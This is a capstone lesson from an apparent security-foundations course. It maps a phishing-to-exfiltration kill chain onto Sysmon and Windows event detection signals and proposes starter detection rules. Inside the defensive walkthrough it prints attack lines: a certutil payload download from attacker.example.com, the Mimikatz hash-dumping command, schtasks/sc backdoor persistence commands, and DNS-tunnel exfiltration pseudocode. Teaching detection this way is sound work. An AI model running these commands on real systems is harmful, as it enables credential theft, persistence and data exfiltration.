# The Detection Imperative — Controls Without Monitoring Are Incomplete

**Module**: M10 · Layered Defense — From Controls to Detection  
**Type**: core  
**Estimated time**: 30 minutes  
**Claim**: C19 from Strata synthesis

---

## The core idea

The research (Claim C19) concludes with a statement that synthesizes everything in this course: **every preventive control must be paired with detection; controls without monitoring provide only partial security**. This final lesson is the capstone — it draws together every detection signal from every module and builds the case for why detection is not optional.

**The detection imperative** is not about paranoia or theoretical risk. It is about accepting one empirical reality: some attacks will succeed. Firewalls are bypassed. Credentials are stolen. Vulnerabilities are exploited before patches are available. Zero-days exist. Insiders act maliciously. When prevention fails — and it will — the question is whether you find out in hours or in months.

**Mean time to detection (MTTD)** is the average time from initial compromise to discovery. The industry average has historically been measured in weeks to months. Organizations with mature detection programs (SIEMs, EDR, threat hunting) achieve MTTD in days or hours. The difference is not the sophistication of the attackers they face — it is whether the defenders can see.

## Why it matters

Everything you have learned builds toward this. The course is titled "security foundations" because these are the foundations on which detection is built:

- You cannot detect TCP SYN floods without understanding what normal TCP looks like (L04)
- You cannot detect DNS C2 without understanding DNS query patterns (L07, L09)
- You cannot detect Pass-the-Hash without knowing what NTLM authentication looks like in event logs (L22, L24, L25)
- You cannot detect Kerberoasting without knowing what RC4 Kerberos tickets signal (L22, L25)
- You cannot detect malicious persistence without baselining normal autostart locations (L26, L27)

Detection is the application of foundational knowledge.

## A concrete example: the full kill chain, with detection

Using the **MITRE ATT&CK framework** as a reference, here is a complete attack scenario showing exactly which detection signals each phase generates — drawing from every module in the course.

**Attack scenario**: External attacker phishes an employee, achieves initial access, moves laterally to a Domain Controller, establishes persistence, and exfiltrates data.

---

### Phase 1 — Initial Access (Spearphishing with malicious macro)

**Attack**: Email with Word document containing a macro that downloads and executes a payload.

```
Email arrives → User opens Word doc → Macro executes → 
certutil.exe downloads payload from attacker.example.com → payload.exe runs
```

**Detection signals**:

| Source | Event | Signal |
|--------|-------|--------|
| Sysmon Event 1 | `WINWORD.EXE` spawns `cmd.exe` spawns `certutil.exe -urlcache` | Macro execution pattern — Word never legitimately spawns certutil |
| Sysmon Event 22 | DNS query for `attacker.example.com` from workstation | New, unknown external domain |
| Sysmon Event 3 | `certutil.exe` → outbound HTTP to external IP | Build tool initiating network connection |
| Proxy logs | HTTP GET for .exe file | Executable download (if proxy performs content inspection) |

**From**: L07 (DNS queries), L09 (external domain monitoring), L27 (Sysmon process and network events)

---

### Phase 2 — Execution and Credential Theft (Mimikatz)

**Attack**: Payload achieves persistence, then runs Mimikatz to extract NT hashes from lsass.

```
payload.exe runs → injects into explorer.exe → 
runs Mimikatz: sekurlsa::logonpasswords → extracts NT hashes including domain admin
```

**Detection signals**:

| Source | Event | Signal |
|--------|-------|--------|
| Sysmon Event 8 | `CreateRemoteThread` from `payload.exe` into `explorer.exe` | Process injection |
| Sysmon Event 10 | `payload.exe` accessing `lsass.exe` (OpenProcess) | Credential dumping |
| Windows Security 4656 | Handle request to `lsass.exe` with `PROCESS_VM_READ` | Mimikatz-style lsass access |
| PowerShell Event 4104 | If launched via PowerShell: `Invoke-Mimikatz` script block | Credential dumping script |
| EDR alert | Behavior matching known Mimikatz patterns | Endpoint detection |

**From**: L25 (Event 4656), L27 (Sysmon Events 8 and 10)

---

### Phase 3 — Lateral Movement (Pass-the-Hash)

**Attack**: Uses Domain Admin NT hash to authenticate to the Domain Controller.

```
Workstation → DC: NTLM authentication with stolen DA hash →
EventID 4624 (Logon) on DC from workstation IP
```

**Detection signals**:

| Source | Event | Signal |
|--------|-------|--------|
| DC Security 4624 | LogonType=3, LmPackageName=NTLM V2, source=workstation | Workstation-to-DC NTLM logon — anomalous |
| DC Security 4672 | Domain Admin privileges assigned at logon | Admin logon from unexpected source |
| DC Security 4776 | NTLM credential validation | DA account validated from non-standard host |
| Network anomaly | First time this workstation authenticated to DC | Source IP anomaly (UEBA) |
| Sysmon (source) Event 3 | `explorer.exe` → DC IP port 445 | SMB connection from compromised workstation |

**From**: L22 (NTLM signals), L24 (pass-the-hash), L25 (Event 4624, 4672, 4776)

---

### Phase 4 — Persistence (Scheduled Task + Service)

**Attack**: Installs a scheduled task and a service for redundant persistence.

```
schtasks /create /tn "WindowsUpdate" /tr "C:\Temp\backdoor.exe" /sc hourly /ru SYSTEM
sc create "WinHelper" binpath= "C:\Temp\backdoor.exe" start= auto
```

**Detection signals**:

| Source | Event | Signal |
|--------|-------|--------|
| Security 4698 | Scheduled task created: `WindowsUpdate` | New task — compare against baseline |
| TaskScheduler 106 | Task registered | Corroborating event |
| System 7045 | Service `WinHelper` installed, `ImagePath=C:\Temp\backdoor.exe` | Service with path in Temp — suspicious |
| Sysmon Event 13 | Registry write to `Services\WinHelper\ImagePath` | Service registration via Registry |
| Autoruns diff | New entries in autostart locations vs. baseline | Delta from known-good state |

**From**: L26 (persistence mechanisms), L27 (Sysmon Registry events), L25 (Event 4698, 7045)

---

### Phase 5 — Exfiltration (DNS Tunneling)

**Attack**: Exfiltrates data using DNS queries to attacker-controlled DNS server.

```
for each chunk of data:
  encode_base64(chunk) → query [encoded].exfil.attacker.example.com
  # Response contains C2 commands
```

**Detection signals**:

| Source | Event | Signal |
|--------|-------|--------|
| DNS logs / Sysmon 22 | High volume of queries to `*.attacker.example.com` | Unusual query pattern |
| DNS analytics | Query subdomain length histogram — normal max 20 chars, these are 60+ chars | Statistical anomaly |
| Network flow | UDP port 53 egress exceeds historical baseline by 10x | Volume anomaly |
| Firewall | DNS queries to external resolvers (not internal DNS servers) | Policy violation — internal hosts should use internal DNS |

**From**: L07 (DNS hierarchy), L09 (DNS C2 detection), L27 (Sysmon Event 22)

---

### The Detection Stack That Sees All of This

No single tool sees all five phases. The detection capability comes from combining:

| Layer | Tool | Phases Detected |
|-------|------|----------------|
| Endpoint telemetry | Sysmon + EDR | 1, 2, 3, 4, 5 |
| Authentication logs | Windows Security Event Log | 2, 3, 4 |
| Network telemetry | Firewall + proxy + DNS logs | 1, 5 |
| Centralization + correlation | SIEM (Splunk, Elastic Security, Sentinel) | All — cross-phase correlation |
| Alerting | Detection rules / SIEM alerts | Automated notification when thresholds crossed |
| Threat hunting | Analyst-driven retrospective queries | Finding what automated rules missed |

---

### Building the Detection Layer: Practical Starting Point

For someone building detection capability from scratch, prioritize in this order:

**Week 1 — Enable the sources**:
1. Deploy Sysmon with SwiftOnSecurity config on all endpoints (L27)
2. Enable Windows Advanced Audit Policy for Logon, Process Creation, Kerberos (L25)
3. Enable PowerShell script block logging (L25)
4. Forward all events to a central log store (ELK, Splunk, Sentinel)

**Week 2 — Write the rules (highest signal-to-noise)**:
1. Office application spawning cmd/PowerShell (macro execution)
2. NTLM V1/V2 authentication on DC from workstation (lateral movement)
3. lsass.exe OpenProcess from non-system processes (credential dumping)
4. New services with ImagePath in user-writable paths (persistence)
5. Scheduled tasks created with executables in Temp/AppData (persistence)
6. DNS query volume anomaly (C2/exfiltration)

**Week 4 — Baseline and tune**:
- Identify and suppress false positives (known-good software that matches rules)
- Document the baseline for each alert type
- Establish response runbooks for each alert

## Key points

- Detection is the application layer of security foundations: understanding protocols, authentication, and persistence mechanisms is what makes detection rules meaningful
- The average dwell time without detection is weeks to months; with mature detection, hours to days; the difference is visibility, not attacker sophistication
- No single tool sees a complete attack kill chain; Sysmon + Security logs + DNS + network telemetry + a SIEM for correlation covers all phases
- Every detection point connects to a foundational concept: TCP signals (L04), DNS anomalies (L09), NTLM events (L22), Kerberos events (L22), credential dump access (L25), persistence events (L26), Sysmon process chains (L27)
- Start with high-signal, low-noise rules: Office apps spawning shells, NTLM on DC from workstations, lsass access, new services/tasks with suspicious paths, DNS volume anomalies
- Prevention + detection is the complete security architecture; prevention alone is partial; detection without prevention is expensive; both together are the minimum viable security posture

## Go deeper

- [S019](../../../../vault/research/security-foundations/01-sources/) — Detection engineering fundamentals, SIEM rule design
- [S020](../../../../vault/research/security-foundations/01-sources/) — MITRE ATT&CK kill chain and detection coverage mapping

---

*[← Previous: Layered Authentication](./L30-layered-authentication.md)* · *Module M10 complete — congratulations on finishing the Security Foundations course!*
